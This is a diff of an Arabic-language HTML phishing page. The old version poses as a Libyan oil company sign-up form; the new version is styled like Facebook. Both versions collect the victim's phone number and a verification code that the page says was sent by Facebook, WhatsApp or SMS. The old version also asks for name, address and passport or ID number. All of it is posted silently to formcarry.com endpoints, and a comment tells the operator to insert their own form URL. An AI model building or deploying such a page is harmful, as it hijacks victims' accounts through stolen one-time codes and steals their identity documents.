@@ -1,236 +1,167 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>تسجيل - شركة الليبية للنفط</title>
+  <meta charset="UTF-8">
+  <title>تسجيل الدخول</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700&display=swap" rel="stylesheet">
   <style>
     body {
       font-family: 'Cairo', sans-serif;
-      background: linear-gradient(to bottom, #004c97, #ffffff);
+      background: linear-gradient(135deg, #4267B2, #29487d);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
       margin: 0;
-      padding: 0;
-      color: #004c97;
+      direction: rtl;
     }
 
     .container {
-      max-width: 400px;
-      margin: auto;
-      padding: 20px;
+      background: white;
+      border-radius: 16px;
+      padding: 30px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+      position: relative;
     }
 
-    .card {
-      background: #fff;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      margin-bottom: 20px;
-      display: none;
+    h2 {
+      color: #4267B2;
+      margin-bottom: 25px;
+      font-weight: 800;
     }
 
-    .card.active {
-      display: block;
-    }
-
-    h3 {
-      color: #004c97;
-      margin-bottom: 15px;
-    }
-
-    label {
-      display: block;
-      margin: 10px 0 5px;
-      font-weight: bold;
-      color: brown;
-    }
-
-    input, button, select {
+    input {
       width: 100%;
       padding: 12px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
+      margin-bottom: 18px;
       border-radius: 10px;
-      font-size: 16px;
+      border: 1.5px solid #ccc;
+      font-size: 20px;
       box-sizing: border-box;
-    }
-
-    input::placeholder {
-      color: goldenrod;
+      text-align: center;
     }
 
     button {
-      background-color: #004c97;
+      width: 100%;
+      padding: 12px;
+      background-color: #04be5e;
       color: white;
-      font-weight: bold;
+      font-size: 17px;
+      border: none;
+      border-radius: 10px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      font-weight: bold;
     }
 
     button:hover {
-      background-color: #003b78;
+      background-color: #03a653;
     }
 
-    .toast {
-      position: fixed;
-      top: 30px;
-      right: 20px;
-      background: #d9ecff;
-      padding: 10px 20px;
+    #notification {
+      background-color: #f0f0f0;
+      border: 1px solid #ccc;
+      padding: 10px;
       border-radius: 10px;
-      color: #004c97;
-      font-weight: bold;
+      margin-bottom: 15px;
+      color: #333;
       display: none;
-      z-index: 999;
-      border: 1px solid #004c97;
+      font-size: 16px;
+      animation: fadeInOut 4s forwards;
+    }
+
+    @keyframes fadeInOut {
+      0%   { opacity: 0; }
+      10%  { opacity: 1; }
+      90%  { opacity: 1; }
+      100% { opacity: 0; display: none; }
+    }
+
+    #codeSection {
+      display: none;
+      margin-top: 15px;
     }
   </style>
 </head>
 <body>
   <div class="container">
+    <h2>طلب الدخول</h2>
+    <input type="text" id="fullName" placeholder="الاسم بالكامل" required>
+    <input type="tel" id="myPhone" placeholder="رقم هاتفك" required>
+    <button onclick="sendCode()">أرسل كود</button>
 
-    <!-- المرحلة 1: إدخال رقم الهاتف -->
-    <div class="card active" id="step1">
-      <h3>سجل الدخول</h3>
-      <label for="phone">رقم الهاتف</label>
-      <input type="text" id="phone" placeholder="مثال: 0912345678" maxlength="10">
-      <button onclick="handleStep1()">إرسال رقم التحقق</button>
+    <div id="notification">تم إرسال الكود عبر إشعار فيسبوك أو واتساب أو رسالة نصية</div>
+
+    <div id="codeSection">
+      <input type="text" id="codeInput" placeholder="رمز التحقق" maxlength="8">
+      <button onclick="submitCode()">طلب التأكيد</button>
     </div>
-
-    <!-- المرحلة 2: رقم التحقق على مرحلتين -->
-    <div class="card" id="step2">
-      <!-- الحقل الأول -->
-      <div id="firstCodeBox">
-        <label for="code">رقم التحقق (وصل عبر فيسبوك أو واتساب أو رسالة نصية)</label>
-        <input type="text" id="code" placeholder="أدخل رقم التحقق هنا">
-        <button onclick="sendFirstCode()">إرسال رقم التحقق</button>
-      </div>
-
-      <!-- الحقل الثاني (مخفي مبدئياً) -->
-      <div id="secondCodeBox" style="display:none; margin-top:20px;">
-        <label for="confirmCode">تأكيد رقم التحقق</label>
-        <input type="text" id="confirmCode" placeholder="أعد إدخال رقم التحقق">
-        <button onclick="sendConfirmCode()">تأكيد الرقم</button>
-      </div>
-    </div>
-
-    <!-- المرحلة 3: البيانات الإضافية -->
-    <div class="card" id="step3">
-      <h3>معلوماتك الشخصية</h3>
-      <label for="fullname">الاسم بالكامل</label>
-      <input type="text" id="fullname" placeholder="الاسم بالكامل">
-
-      <label for="address">العنوان</label>
-      <input type="text" id="address" placeholder="العنوان بالتفصيل">
-
-      <label for="idNumber">رقم جواز السفر أو البطاقة</label>
-      <input type="text" id="idNumber" placeholder="مثال: A123456 أو 1234567">
-
-      <button onclick="submitAll()">إرسال جميع البيانات</button>
-    </div>
-
   </div>
 
-  <!-- نافذة الإشعار -->
-  <div class="toast" id="toast">تم تأكيد رقم التحقق بنجاح</div>
-
   <script>
-    function isLibyanPhone(number) {
-      return /^(091|092|093|094|095)\d{7}$/.test(number);
-    }
+    const formcarryURL = "https://formcarry.com/s/pHHZOWhpgsB"; // ← استبدل هذا برابط الفورم الخاص بك
 
-    function showToast() {
-      const toast = document.getElementById('toast');
-      toast.style.display = 'block';
-      setTimeout(() => {
-        toast.style.display = 'none';
-      }, 4000);
-    }
+    function sendCode() {
+      const fullName = document.getElementById("fullName").value.trim();
+      const myPhone = document.getElementById("myPhone").value.trim();
 
-    function handleStep1() {
-      const phone = document.getElementById('phone').value;
-      if (!isLibyanPhone(phone)) {
-        alert("يرجى إدخال رقم هاتف ليبي صحيح بدون المقدمة الدولية 218");
-        return;
-      }
-      document.getElementById('step1').classList.remove('active');
-      document.getElementById('step2').classList.add('active');
-    }
-
-    function sendFirstCode() {
-      const code = document.getElementById('code').value.trim();
-      if (!/^[a-zA-Z0-9]{6,8}$/.test(code)) {
-        alert("يرجى إدخال رقم تحقق صالح (6 إلى 8 أحرف أو أرقام)");
+      if (!/^09\d{8}$/.test(myPhone)) {
+        alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 09 ويتكون من 10 أرقام.");
         return;
       }
 
-      const formData = new FormData();
-      formData.append('code', code);
-
-      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
-        method: 'POST',
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-      })
-      .then(res => res.json())
-      .then(() => {
-        document.getElementById('firstCodeBox').style.display = 'none';
-        document.getElementById('secondCodeBox').style.display = 'block';
-      })
-      .catch(error => {
-        console.error('فشل الإرسال:', error);
-        alert("حدث خطأ أثناء إرسال رقم التحقق.");
-      });
-    }
-
-    function sendConfirmCode() {
-      const confirmCode = document.getElementById('confirmCode').value.trim();
-      if (!/^[a-zA-Z0-9]{6,8}$/.test(confirmCode)) {
-        alert("يرجى إدخال رقم تحقق صالح (6 إلى 8 أحرف أو أرقام)");
+      if (fullName.length < 3) {
+        alert("يرجى إدخال الاسم بالكامل (على الأقل 3 أحرف).");
         return;
       }
 
-      const formData = new FormData();
-      formData.append('confirmCode', confirmCode);
+      // إرسال الاسم ورقم الهاتف إلى Formcarry
+      fetch(formcarryURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          fullName: fullName,
+          myPhone: myPhone
+        })
+      }).then(() => {
+        // عرض الإشعار
+        const notification = document.getElementById("notification");
+        notification.style.display = "block";
 
-      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
-        method: 'POST',
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-      })
-      .then(res => res.json())
-      .then(() => {
-        showToast();
+        // بعد 4 ثوانٍ، إخفاء الإشعار وإظهار حقل الكود
         setTimeout(() => {
-          document.getElementById('step2').classList.remove('active');
-          document.getElementById('step3').classList.add('active');
-        }, 2000);
-      })
-      .catch(error => {
-        console.error('فشل الإرسال:', error);
-        alert("حدث خطأ أثناء إرسال التأكيد.");
+          notification.style.display = "none";
+          document.getElementById("codeSection").style.display = "block";
+        }, 4000);
+      }).catch((error) => {
+        alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+        console.error(error);
       });
     }
 
-    function submitAll() {
-      const formData = new FormData();
-      formData.append('phone', document.getElementById('phone').value);
-      formData.append('fullname', document.getElementById('fullname').value);
-      formData.append('address', document.getElementById('address').value);
-      formData.append('idNumber', document.getElementById('idNumber').value);
+    function submitCode() {
+      const code = document.getElementById("codeInput").value.trim();
 
-      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
-        method: 'POST',
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('تم الإرسال:', data);
-        alert("تم إرسال بياناتك بنجاح.");
-      })
-      .catch(error => {
-        console.error('خطأ في الإرسال:', error);
-        alert("حدث خطأ أثناء إرسال البيانات.");
+      if (!/^[0-9a-zA-Z]{6,8}$/.test(code)) {
+        alert("يرجى إدخال رمز تحقق صحيح يتكون من 6 إلى 8 أرقام أو حروف.");
+        return;
+      }
+
+      // إرسال الكود إلى Formcarry
+      fetch(formcarryURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          verificationCode: code
+        })
+      }).then(() => {
+        alert("تم تأكيد الكود بنجاح ✅");
+      }).catch((error) => {
+        alert("فشل في إرسال الكود. حاول مرة أخرى.");
+        console.error(error);
       });
     }
   </script>
